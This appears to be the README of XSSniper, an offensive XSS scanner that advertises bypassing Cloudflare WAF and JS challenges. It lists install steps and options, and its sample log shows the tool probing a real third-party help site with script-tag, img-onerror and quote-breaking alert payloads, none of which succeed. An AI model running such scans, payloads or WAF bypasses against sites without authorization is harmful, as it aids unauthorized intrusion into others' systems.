# XSSniper

<img src="background.png" width="900">

## A XSS scanner with WAF bypass features

<!-- FEATURES -->
## Features:

- Cloudflare WAF and JS challenge bypass with user-agent rotation and cloudscraper
- Finds potentially vulnerable JavaScript code and searches for injection points
- Built-in fuzzer and crawler
- Creates a PoC for XSS and tests it automatically
- Written in Python
- Lots of payloads

<!-- INSTALLATION -->
## Installation:

    $ git clone https://github.com/umutcamliyurt/XSSniper.git
    $ cd XSSniper/
    $ sudo apt-get install python3 python3-pip
    $ pip3 install -r requirements.txt
    $ python3 XSSniper.py

<!-- USAGE -->
## Usage:

### Options:

```
python3 XSSniper.py --help
usage: XSSniper.py [-h] [-c COOKIE] [-o OUTPUT_DIR] [--log LOG] [--headless] [--poc] [-f FORMS] [--keep-going] [--delay DELAY] [-v] url

XSSniper - A XSS scanner with WAF bypass features

positional arguments:
  url                   Target URL (include http(s)://)

options:
  -h, --help            show this help message and exit
  -c, --cookie COOKIE   Optional cookie header
  -o, --output-dir OUTPUT_DIR
                        Directory for outputs
  --log LOG             Log file path
  --headless            Run browser headless
  --poc                 Enable PoC mode (requires prior scan)
  -f, --forms FORMS     Comma-separated form 'name' values for PoC (default: all)
  --keep-going          Continue tests after first PoC found
  --delay DELAY         Seconds to wait after page load
  -v, --verbose         Verbose console logging
```
<!-- EXAMPLE -->
### Example:

```
python3 XSSniper.py https://www.help.tinder.com --poc -v
2025-07-08 14:48:48 [INFO] [*] Testing https://www.help.tinder.com via requests...
2025-07-08 14:48:49 [WARNING] Request test failed (Blocked by Cloudflare or similar); trying cloudscraper...
2025-07-08 14:48:50 [WARNING] Cloudscraper also blocked; launching browser for manual captcha solution.
2025-07-08 14:48:50 [INFO] Please solve the captcha in the opened browser. Then return here and press Enter to continue.
Press Enter after solving captcha in the browser...
2025-07-08 14:49:01 [INFO] Using User-Agent from browser: Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/124.0.6367.98 Mobile/15E148 Safari/604.1
2025-07-08 14:49:03 [INFO] [PoC] Scanning https://www.help.tinder.com
2025-07-08 14:49:07 [INFO] Testing form action:search_0
2025-07-08 14:49:15 [DEBUG] No alert for payload <script>alert("XSS by Nemesis")</script> on form action:search_0
2025-07-08 14:49:24 [DEBUG] No alert for payload "<img src=x onerror=alert("XSS by Nemesis")> on form action:search_0
2025-07-08 14:49:33 [DEBUG] No alert for payload ';alert("XSS by Nemesis")// on form action:search_0
```

<!-- LICENSE -->
## License

Distributed under the MIT License. See `LICENSE` for more information.